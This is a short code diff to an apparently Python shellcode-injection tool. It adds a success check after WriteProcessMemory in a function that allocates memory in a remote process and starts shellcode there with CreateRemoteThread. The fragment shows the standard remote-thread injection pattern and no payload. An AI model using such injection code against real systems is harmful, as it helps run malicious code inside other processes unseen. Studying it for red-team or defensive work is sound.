@@ -71,7 +71,9 @@ def Inject(path, shellcode):
     print('[+] - Allocated remote memory at ', hex(lpBuffer))
 
     # write shellcode in allocated memory
-    WriteProcessMemory(process_handle, lpBuffer, shellcode, shellcode_length, 0)
+    res = WriteProcessMemory(process_handle, lpBuffer, shellcode, shellcode_length, 0)
+    if res > 0 :
+        print('[+] - Shellcode written.')
 
     # create remote thread to start shellcode execution
     CreateRemoteThread(process_handle, None, 0, lpBuffer, 0, 0, 0)
